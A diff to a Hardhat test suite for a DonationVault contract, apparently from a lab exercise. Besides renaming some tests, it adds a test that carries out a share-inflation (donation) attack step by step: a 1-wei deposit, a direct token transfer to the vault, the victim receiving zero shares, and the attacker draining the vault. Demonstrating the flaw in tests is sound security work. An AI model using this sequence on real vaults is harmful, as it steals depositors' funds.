@@ -3,10 +3,10 @@ const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
 describe("DonationVault", function () {
-    let DonationVault, donationVault, vaultAddress, MockERC20, mockERC20, tokenAddress, owner, depositUser1, depositUser2, depositUser3;
+    let DonationVault, donationVault, vaultAddress, MockERC20, mockERC20, tokenAddress, owner, depositUser1, depositUser2, depositUser3, maliceUser;
 
     beforeEach(async function () {
-        [owner, depositUser1, depositUser2, depositUser3, donationUser, vaultOwner] = await ethers.getSigners();
+        [owner, depositUser1, depositUser2, depositUser3, donationUser, vaultOwner, maliceUser] = await ethers.getSigners();
 
         // Deploy a mock ERC20 token
         MockERC20 = await ethers.getContractFactory("Lab4Token");
@@ -18,6 +18,7 @@ describe("DonationVault", function () {
         await mockERC20.transfer(depositUser2.address, ethers.parseEther("100"));
         await mockERC20.transfer(depositUser3.address, ethers.parseEther("100"));
         await mockERC20.transfer(donationUser.address, ethers.parseEther("100"));
+        await mockERC20.transfer(maliceUser.address, ethers.parseEther("101"));
 
         // Deploy the DonationVault contract
         DonationVault = await ethers.getContractFactory("DonationVault");
@@ -133,7 +134,7 @@ describe("DonationVault", function () {
         expect(sharePrice).to.be.closeTo(ethers.parseEther("0.9"), ethers.parseEther("0.0001"));
     });
 
-    it("Scenario 1", async function () {
+    it("Should simulate scenario 1", async function () {
         const aliceDeposit = ethers.parseEther("100");
         const bobDeposit = ethers.parseEther("100");
         const donationAmount = ethers.parseEther("100");
@@ -189,7 +190,7 @@ describe("DonationVault", function () {
         expect(vaultBalance).to.equal(ethers.parseEther("75")); // 150 - 75 (Bob's withdrawal)
     });
 
-    it("Scenario 2", async function () {
+    it("Should simulate scenario 2", async function () {
         const aliceDeposit = ethers.parseEther("100");
         const bobDeposit = ethers.parseEther("100");
         const donationAmount = ethers.parseEther("100");
@@ -270,4 +271,46 @@ describe("DonationVault", function () {
         const sharePrice = await donationVault.sharePrice();
         expect(sharePrice).to.be.closeTo(ethers.parseEther("1.5"), ethers.parseEther("0.0001")); // Vault balance (150) / total shares (100)
     });
+
+    it("Should simulate an inflation attack", async function () {
+        const maliceDeposit = 1; // Malice deposits a small amount
+        const maliceTransfer = ethers.parseEther("100"); // Malice transfers 100 tokens to the vault
+        const bobDeposit = ethers.parseEther("100"); // Bob deposits a significant amount
+    
+        // Malice deposits 1 token into the empty vault
+        await mockERC20.connect(maliceUser).approve(vaultAddress, maliceDeposit);
+        await donationVault.connect(maliceUser).deposit(maliceDeposit);
+    
+        // Check Malice's shares and vault balance
+        let maliceShares = await donationVault.balanceOf(maliceUser.address);
+        expect(maliceShares).to.equal(1); 
+    
+        let vaultBalance = await mockERC20.balanceOf(vaultAddress);
+        expect(vaultBalance).to.equal(maliceDeposit); // Vault balance is 1 token
+    
+        // Attacker front runs Bob's deposit
+        await mockERC20.connect(maliceUser).transfer(vaultAddress, maliceTransfer);
+
+        // Bob deposits 100 tokens
+        await mockERC20.connect(depositUser2).approve(vaultAddress, bobDeposit);
+        await donationVault.connect(depositUser2).deposit(bobDeposit);
+    
+        // Check Bob's shares and vault balance
+        let bobShares = await donationVault.balanceOf(depositUser2.address);
+        expect(bobShares).to.equal(0); // Bob receives no shares due to manipulated share price
+    
+        vaultBalance = await mockERC20.balanceOf(vaultAddress);
+        expect(vaultBalance).to.equal(BigInt(maliceDeposit) + maliceTransfer + bobDeposit); // Vault balance is 201 tokens
+    
+        // Malice withdraws their shares
+        await donationVault.connect(maliceUser).withdraw(maliceShares);
+    
+        // Check Malice's balance and vault balance
+        const maliceBalance = await mockERC20.balanceOf(maliceUser.address);
+        expect(maliceBalance).to.equal(ethers.parseEther("201")); // Malice withdraws all tokens (steals Bob's deposit)
+    
+        vaultBalance = await mockERC20.balanceOf(vaultAddress);
+        expect(vaultBalance).to.equal(0); // Vault is drained
+    });
 });
+
